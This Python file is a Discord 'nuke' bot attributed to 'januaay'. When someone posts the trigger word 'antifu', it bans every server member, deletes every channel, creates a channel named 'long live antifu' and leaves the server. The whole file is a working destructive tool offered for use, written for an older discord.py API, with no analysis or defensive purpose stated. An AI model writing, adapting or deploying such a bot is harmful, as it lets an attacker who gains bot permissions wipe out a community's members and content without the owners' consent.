import discord
from discord.ext.commands import Bot
from discord.ext import commands
import time
import asyncio
bot = commands.Bot(command_prefix='')
@bot.listen()
async def on_ready():
    print("ready")

#made by januaay

@bot.listen()
async def on_message(message):
    if message.content == "antifu":
        count = 0
        x = message.server.members
        y = len(list(x))
        while(count <=(y-1)): 
            try:
                await bot.ban(list(x)[count])
                print("banned "+list(x)[count])
            except:
                print("failed to ban")
            count = count + 1
        channels = message.server.channels
        channelstore = list(channels)
        channelcount = len(list(channelstore))
        count = 0
        while(count <=(channelcount-1)):
            await bot.delete_channel(list(channels)[count])
            channels = list(channelstore)
            print("deleted "+list(channels)[count].name)
            count = count + 1
        await bot.create_channel(message.server,"long live antifu")
        await bot.leave_server(message.server)

